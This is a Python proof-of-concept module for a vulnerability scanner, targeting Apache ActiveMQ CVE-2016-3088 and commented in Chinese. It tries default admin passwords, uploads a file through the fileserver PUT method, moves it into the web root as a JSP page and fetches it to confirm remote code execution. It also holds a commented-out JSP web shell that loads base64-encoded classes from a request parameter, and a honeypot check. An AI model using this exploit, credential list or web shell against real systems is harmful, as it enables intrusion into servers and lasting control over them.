# coding:utf-8  
import requests,re
from lib.core.common import url_handle,get_random_ua,Str2Base64,random_str
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache ActiveMQ 远程代码执行漏洞(CVE-2016-3088)",                        # 漏洞名称
        "VulnID" : "CVE-2016-3088",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Apache ActiveMQ",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        if self.port == None:
            self.target += ":8161"

        url = self.target + "/admin/test/systemProperties.jsp" # url自己按需调整
        
        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                            }
        filename = random_str()
        filecontent = random_str()
#         filecontent = """
# <%!
# class ON extends ClassLoader{
#   ON(ClassLoader c){super(c);}
#   public Class qualified(byte[] b){
#     return super.defineClass(b, 0, b.length);
#   }
# }
# public byte[] interacts(String str) throws Exception {
#   Class base64;
#   byte[] value = null;
#   try {
#     base64=Class.forName("sun.misc.BASE64Decoder");
#     Object decoder = base64.newInstance();
#     value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
#   } catch (Exception e) {
#     try {
#       base64=Class.forName("java.util.Base64");
#       Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
#       value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
#     } catch (Exception ee) {}
#   }
#   return value;
# }
# %>
# <%
# String cls = request.getParameter("123");
# if (cls != null) {
#   new ON(this.getClass().getClassLoader()).qualified(interacts(cls)).newInstance().equals(new Object[]{request,response});
# }
# %>
# """
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            for i in ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]:

                headers["Authorization"] = "Basic " + Str2Base64(i)

                req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req.status_code == 200:
                    path = re.findall('<td class="label">activemq.home</td>.*?<td>(.*?)</td>', req.text, re.S)[0]
                    break
                
            req0 = requests.put(self.target+"/fileserver/" + filename + ".txt",data=filecontent,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 204:
                headers["Destination"] = "file://" + path + "/webapps/api/" + filename + ".jsp"
                move_req = requests.request("MOVE",self.target + "/fileserver/" + filename + ".txt",headers=headers,timeout=self.timeout,verify=False,proxies=self.proxy)
                
                del headers["Destination"]
                req2 = requests.get(self.target + "/api/" + filename + ".jsp",headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if filecontent in req2.text:
                    vuln = [True,"<title>ActiveMQ账号密码：" + i + "  文件地址：" + self.target + "/api/" + filename + ".jsp" + "</title>"]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()